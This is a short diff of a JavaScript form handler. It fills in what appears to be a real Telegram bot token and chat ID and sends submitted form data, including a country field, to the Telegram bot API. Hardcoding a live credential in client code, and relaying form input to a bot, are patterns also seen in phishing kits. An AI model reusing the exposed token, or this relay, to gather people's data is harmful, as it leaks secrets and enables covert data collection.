@@ -21,8 +21,8 @@ document.getElementById("dataForm").addEventListener("submit", function(e) {
 الدولة: ${data.country}
   `;
 
-  const token = "TOKEN";
-  const chat_id = "0000";
+  const token = "7874509299:AAEXnwpKl-m7E2pVuuYWxfixW-YC1oZ3Ng0";
+  const chat_id = "6817512459";
 
   fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
